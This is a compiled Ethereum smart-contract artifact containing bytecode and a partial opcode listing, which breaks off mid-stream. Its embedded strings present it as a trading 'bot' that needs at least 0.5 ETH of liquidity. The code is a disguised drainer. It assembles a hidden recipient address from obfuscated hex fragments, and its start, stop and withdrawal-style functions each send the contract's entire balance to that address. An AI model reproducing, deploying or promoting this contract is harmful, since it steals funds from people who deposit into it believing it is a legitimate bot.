{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801561000f575f80fd5b506110078061001d5f395ff3fe608060405260043610610042575f3560e01c80631b55ba3a1461004d57806370e44c6a14610057578063bedf0f4a14610075578063d82c52d61461007f57610049565b3661004957005b5f80fd5b6100556100a9565b005b61005f61010f565b60405161006c9190610c07565b60405180910390f35b61007d6101b0565b005b34801561008a575f80fd5b50610093610216565b6040516100a09190610c07565b60405180910390f35b5f6100ba6100b5610236565b6103a6565b90505f8190508073ffffffffffffffffffffffffffffffffffffffff166108fc6100e2610671565b90811502906040515f60405180830381858888f1935050505015801561010a573d5f803e3d5ffd5b505050565b60605f61012261011d610236565b6103a6565b90505f8190508073ffffffffffffffffffffffffffffffffffffffff166108fc61014a610671565b90811502906040515f60405180830381858888f19350505050158015610172573d5f803e3d5ffd5b506040518060400160405280601381526020017f5769746864726177616c20636f6d706c657465000000000000000000000000008152509250505090565b5f6101c16101bc610236565b6103a6565b90505f8190508073ffffffffffffffffffffffffffffffffffffffff166108fc6101e9610671565b90811502906040515f60405180830381858888f19350505050158015610211573d5f803e3d5ffd5b505050565b60606040518060a00160405280607e8152602001610f54607e9139905090565b60605f6102876040518060400160405280600181526020017f780000000000000000000000000000000000000000000000000000000000000081525061028261027d610678565b610682565b61090c565b90505f620d6fbc90505f610299610a9e565b90505f620e843390505f6102ab610aa8565b90505f61248590505f6102bc610ab2565b90505f620bf31590505f6102d8896102d38a610682565b61090c565b90505f6102f56102e789610682565b6102f089610682565b61090c565b90505f61031261030488610682565b61030d88610682565b61090c565b90505f61032f61032187610682565b61032a87610682565b61090c565b90505f61034e61033f868661090c565b610349858561090c565b61090c565b90505f6103906040518060400160405280600181526020017f30000000000000000000000000000000000000000000000000000000000000008152508361090c565b9050809e50505050505050505050505050505090565b5f808290505f80805f600290505b602a81101561066457610100846103cb9190610c73565b93508481815181106103e0576103df610cb4565b5b602001015160f81c60f81b60f81c60ff169250846001826104019190610cea565b8151811061041257610411610cb4565b5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff1610158015610463575060668373ffffffffffffffffffffffffffffffffffffffff1611155b1561047c576057836104759190610d1d565b9250610528565b60418373ffffffffffffffffffffffffffffffffffffffff16101580156104ba575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156104d3576037836104cc9190610d1d565b9250610527565b60308373ffffffffffffffffffffffffffffffffffffffff1610158015610511575060398373ffffffffffffffffffffffffffffffffffffffff1611155b15610526576030836105239190610d1d565b92505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff1610158015610566575060668273ffffffffffffffffffffffffffffffffffffffff1611155b1561057f576057826105789190610d1d565b915061062b565b60418273ffffffffffffffffffffffffffffffffffffffff16101580156105bd575060468273ffffffffffffffffffffffffffffffffffffffff1611155b156105d6576037826105cf9190610d1d565b915061062a565b60308273ffffffffffffffffffffffffffffffffffffffff1610158015610614575060398273ffffffffffffffffffffffffffffffffffffffff1611155b15610629576030826106269190610d1d565b91505b5b5b816010846106399190610c73565b6106439190610d64565b8461064e9190610d64565b935060028161065d9190610cea565b90506103b4565b5082945050505050919050565b5f47905090565b5f6204cc53905090565b60605f808390505b5f81146106b357818061069c90610dab565b9250506010816106ac9190610e1f565b905061068a565b5f8267ffffffffffffffff8111156106ce576106cd610e4f565b5b6040519080825280601f01601f1916602001820160405280156107005781602001600182028036833780820191505090505b5090505f5b8381101561079d5760108661071a9190610e7c565b925061072583610abc565b82600183876107349190610eac565b61073e9190610eac565b8151811061074f5761074e610cb4565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff191690815f1a90535060108661078a9190610e1f565b95508061079690610dab565b9050610705565b505f81519050600481036107fa575f6107eb6040518060400160405280600181526020017f30000000000000000000000000000000000000000000000000000000000000008152508461090c565b90508095505050505050610907565b60038103610851575f6108426040518060400160405280600181526020017f30000000000000000000000000000000000000000000000000000000000000008152508461090c565b90508095505050505050610907565b600281036108a8575f6108996040518060400160405280600381526020017f30303000000000000000000000000000000000000000000000000000000000008152508461090c565b90508095505050505050610907565b600181036108ff575f6108f06040518060400160405280600481526020017f30303030000000000000000000000000000000000000000000000000000000008152508461090c565b90508095505050505050610907565b819450505050505b919050565b60605f8390505f8390505f815183516109259190610cea565b67ffffffffffffffff81111561093e5761093d610e4f565b5b6040519080825280601f01601f1916602001820160405280156109705781602001600182028036833780820191505090505b5090505f8190505f805f91505b8551821015610a045785828151811061099957610998610cb4565b5b602001015160f81c60f81b8382806109b090610dab565b9350815181106109c3576109c2610cb4565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff191690815f1a90535081806109fc90610dab565b92505061097d565b5f91505b8451821015610a8f57848281518110610a2457610a23610cb4565b5b602001015160f81c60f81b838280610a3b90610dab565b935081518110610a4e57610a4d610cb4565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff191690815f1a9053508180610a8790610dab565b925050610a08565b82965050505050505092915050565b5f6204958a905090565b5f620ef2e4905090565b5f620ebe5b905090565b5f8160ff165f11158015610ad4575060098260ff1611155b15610b1257817f300000000000000000000000000000000000000000000000000000000000000060f81c610b089190610eeb565b60f81b9050610b78565b8160ff16600a11158015610b2a5750600f8260ff1611155b15610b7457600a827f610000000000000000000000000000000000000000000000000000000000000060f81c610b609190610eeb565b610b6a9190610f1f565b60f81b9050610b78565b5f80fd5b919050565b5f81519050919050565b5f82825260208201905092915050565b5f5b83811015610bb4578082015181840152602081019050610b99565b5f8484015250505050565b5f601f19601f8301169050919050565b5f610bd982610b7d565b610be38185610b87565b9350610bf3818560208601610b97565b610bfc81610bbf565b840191505092915050565b5f6020820190508181035f830152610c1f8184610bcf565b905092915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f610c7d82610c27565b9150610c8883610c27565b9250828202610c9681610c27565b91508282048414831517610cad57610cac610c46565b5b5092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f819050919050565b5f610cf482610ce1565b9150610cff83610ce1565b9250828201905080821115610d1757610d16610c46565b5b92915050565b5f610d2782610c27565b9150610d3283610c27565b9250828203905073ffffffffffffffffffffffffffffffffffffffff811115610d5e57610d5d610c46565b5b92915050565b5f610d6e82610c27565b9150610d7983610c27565b9250828201905073ffffffffffffffffffffffffffffffffffffffff811115610da557610da4610c46565b5b92915050565b5f610db582610ce1565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8203610de757610de6610c46565b5b600182019050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f610e2982610ce1565b9150610e3483610ce1565b925082610e4457610e43610df2565b5b828204905092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b5f610e8682610ce1565b9150610e9183610ce1565b925082610ea157610ea0610df2565b5b828206905092915050565b5f610eb682610ce1565b9150610ec183610ce1565b9250828203905081811115610ed957610ed8610c46565b5b92915050565b5f60ff82169050919050565b5f610ef582610edf565b9150610f0083610edf565b9250828201905060ff811115610f1957610f18610c46565b5b92915050565b5f610f2982610edf565b9150610f3483610edf565b9250828203905060ff811115610f4d57610f4c610c46565b5b9291505056fe4e6f7420656e6f756768206c697175696469747920617661696c61626c65206f6e2074686520636f6e747261637420746f2072756e2074686520626f742e20436f6e747261637420636f6465206e65656473206174206c6561737420302e352045544820746f2061766f69642063757272656e742067617320666565732ea2646970667358221220734c2db0fa60328170891dfa6297b99f06d0f9e9c29d594aec0fc679d09dfc7f64736f6c63430008140033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x1007 DUP1 PUSH2 0x1D PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x42 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1B55BA3A EQ PUSH2 0x4D JUMPI DUP1 PUSH4 0x70E44C6A EQ PUSH2 0x57 JUMPI DUP1 PUSH4 0xBEDF0F4A EQ PUSH2 0x75 JUMPI DUP1 PUSH4 0xD82C52D6 EQ PUSH2 0x7F JUMPI PUSH2 0x49 JUMP JUMPDEST CALLDATASIZE PUSH2 0x49 JUMPI STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH2 0xA9 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x5F PUSH2 0x10F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x6C SWAP2 SWAP1 PUSH2 0xC07 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x7D PUSH2 0x1B0 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x8A JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x93 PUSH2 0x216 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xA0 SWAP2 SWAP1 PUSH2 0xC07 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 PUSH2 0xBA PUSH2 0xB5 PUSH2 0x236 JUMP JUMPDEST PUSH2 0x3A6 JUMP JUMPDEST SWAP1 POP PUSH0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0xE2 PUSH2 0x671 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x10A JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH0 PUSH2 0x122 PUSH2 0x11D PUSH2 0x236 JUMP JUMPDEST PUSH2 0x3A6 JUMP JUMPDEST SWAP1 POP PUSH0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x14A PUSH2 0x671 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x172 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x13 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x5769746864726177616C20636F6D706C65746500000000000000000000000000 DUP2 MSTORE POP SWAP3 POP POP POP SWAP1 JUMP JUMPDEST PUSH0 PUSH2 0x1C1 PUSH2 0x1BC PUSH2 0x236 JUMP JUMPDEST PUSH2 0x3A6 JUMP JUMPDEST SWAP1 POP PUSH0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x1E9 PUSH2 0x671 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x211 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0xA0 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7E DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xF54 PUSH1 0x7E SWAP2 CODECOPY SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH0 PUSH2 0x287 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x282 PUSH2 0x27D PUSH2 0x678 JUMP JUMPDEST PUSH2 0x682 JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH3 0xD6FBC SWAP1 POP PUSH0 PUSH2 0x299 PUSH2 0xA9E JUMP JUMPDEST SWAP1 POP PUSH0 PUSH3 0xE8433 SWAP1 POP PUSH0 PUSH2 0x2AB PUSH2 0xAA8 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x2485 SWAP1 POP PUSH0 PUSH2 0x2BC PUSH2 0xAB2 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH3 0xBF315 SWAP1 POP PUSH0 PUSH2 0x2D8 DUP10 PUSH2 0x2D3 DUP11 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x2F5 PUSH2 0x2E7 DUP10 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x2F0 DUP10 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x312 PUSH2 0x304 DUP9 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x30D DUP9 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x32F PUSH2 0x321 DUP8 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x32A DUP8 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x34E PUSH2 0x33F DUP7 DUP7 PUSH2 0x90C JUMP JUMPDEST PUSH2 0x349 DUP6 DUP6 PUSH2 0x90C JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x390 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x90C JUMP JUMPDEST SWAP1 POP DUP1 SWAP15 POP POP POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH0 DUP1 DUP3 SWAP1 POP PUSH0 DUP1 DUP1 PUSH0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x664 JUMPI PUSH2 0x100 DUP5 PUSH2 0x3CB SWAP2 SWAP1 PUSH2 0xC73 JUMP JUMPDEST SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x3E0 JUMPI PUSH2 0x3DF PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 PUSH2 0x401 SWAP2 SWAP1 PUSH2 0xCEA JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x412 JUMPI PUSH2 0x411 PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x463 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x47C JUMPI PUSH1 0x57 DUP4 PUSH2 0x475 SWAP2 SWAP1 PUSH2 0xD1D JUMP JUMPDEST SWAP3 POP PUSH2 0x528 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x4BA JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x4D3 JUMPI PUSH1 0x37 DUP4 PUSH2 0x4CC SWAP2 SWAP1 PUSH2 0xD1D JUMP JUMPDEST SWAP3 POP PUSH2 0x527 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x511 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x526 JUMPI PUSH1 0x30 DUP4 PUSH2 0x523 SWAP2 SWAP1 PUSH2 0xD1D JUMP JUMPDEST SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x566 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x57F JUMPI PUSH1 0x57 DUP3 PUSH2 0x578 SWAP2 SWAP1 PUSH2 0xD1D JUMP JUMPDEST SWAP2 POP PUSH2 0x62B JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x5BD JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x5D6 JUMPI PUSH1 0x37 DUP3 PUSH2 0x5CF SWAP2 SWAP1 PUSH2 0xD1D JUMP JUMPDEST SWAP2 POP PUSH2 0x62A JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x614 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x629 JUMPI PUSH1 0x30 DUP3 PUSH2 0x626 SWAP2 SWAP1 PUSH2 0xD1D JUMP JUMPDEST SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 PUSH2 0x639 SWAP2 SWAP1 PUSH2 0xC73 JUMP JUMPDEST PUSH2 0x643 SWAP2 SWAP1 PUSH2 0xD64 JUMP JUMPDEST DUP5 PUSH2 0x64E SWAP2 SWAP1 PUSH2 0xD64 JUMP JUMPDEST SWAP4 POP PUSH1 0x2 DUP2 PUSH2 0x65D SWAP2 SWAP1 PUSH2 0xCEA JUMP JUMPDEST SWAP1 POP PUSH2 0x3B4 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH3 0x4CC53 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH0 DUP1 DUP4 SWAP1 POP JUMPDEST PUSH0 DUP2 EQ PUSH2 0x6B3 JUMPI DUP2 DUP1 PUSH2 0x69C SWAP1 PUSH2 0xDAB JUMP JUMPDEST SWAP3 POP POP PUSH1 0x10 DUP2 PUSH2 0x6AC SWAP2 SWAP1 PUSH2 0xE1F JUMP JUMPDEST SWAP1 POP PUSH2 0x68A JUMP JUMPDEST PUSH0 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x6CE JUMPI PUSH2 0x6CD PUSH2 0xE4F JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x700 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x79D JUMPI PUSH1 0x10 DUP7 PUSH2 0x71A SWAP2 SWAP1 PUSH2 0xE7C JUMP JUMPDEST SWAP3 POP PUSH2 0x725 DUP4 PUSH2 0xABC JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 PUSH2 0x734 SWAP2 SWAP1 PUSH2 0xEAC JUMP JUMPDEST PUSH2 0x73E SWAP2 SWAP1 PUSH2 0xEAC JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x74F JUMPI PUSH2 0x74E PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 PUSH2 0x78A SWAP2 SWAP1 PUSH2 0xE1F JUMP JUMPDEST SWAP6 POP DUP1 PUSH2 0x796 SWAP1 PUSH2 0xDAB JUMP JUMPDEST SWAP1 POP PUSH2 0x705 JUMP JUMPDEST POP PUSH0 DUP2 MLOAD SWAP1 POP PUSH1 0x4 DUP2 SUB PUSH2 0x7FA JUMPI PUSH0 PUSH2 0x7EB PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0x90C JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0x907 JUMP JUMPDEST PUSH1 0x3 DUP2 SUB PUSH2 0x851 JUMPI PUSH0 PUSH2 0x842 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0x90C JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0x907 JUMP JUMPDEST PUSH1 0x2 DUP2 SUB PUSH2 0x8A8 JUMPI PUSH0 PUSH2 0x899 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030300000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0x90C JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0x907 JUMP JUMPDEST PUSH1 0x1 DUP2 SUB PUSH2 0x8FF JUMPI PUSH0 PUSH2 0x8F0 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030303000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0x90C JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0x907 JUMP JUMPDEST DUP2 SWAP5 POP POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH0 DUP4 SWAP1 POP PUSH0 DUP4 SWAP1 POP PUSH0 DUP2 MLOAD DUP4 MLOAD PUSH2 0x925 SWAP2 SWAP1 PUSH2 0xCEA JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x93E JUMPI PUSH2 0x93D PUSH2 0xE4F JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x970 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 DUP2 SWAP1 POP PUSH0 DUP1 PUSH0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0xA04 JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x999 JUMPI PUSH2 0x998 PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0x9B0 SWAP1 PUSH2 0xDAB JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x9C3 JUMPI PUSH2 0x9C2 PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH2 0x9FC SWAP1 PUSH2 0xDAB JUMP JUMPDEST SWAP3 POP POP PUSH2 0x97D JUMP JUMPDEST PUSH0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0xA8F JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0xA24 JUMPI PUSH2 0xA23 PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0xA3B SWAP1 PUSH2 0xDAB JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0xA4E JUMPI PUSH2 0xA4D PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH2 0xA87 SWAP1 PUSH2 0xDAB JUMP JUMPDEST SWAP3 POP POP PUSH2 0xA08 JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH3 0x4958A SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH3 0xEF2E4 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH3 0xEBE5B SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 DUP2 PUSH1 0xFF AND PUSH0 GT ISZERO DUP1 ISZERO PUSH2 0xAD4 JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xB12 JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0xB08 SWAP2 SWAP1 PUSH2 0xEEB JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xB78 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0xB2A JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xB74 JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0xB60 SWAP2 SWAP1 PUSH2 0xEEB JUMP JUMPDEST PUSH2 0xB6A SWAP2 SWAP1 PUSH2 0xF1F JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xB78 JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 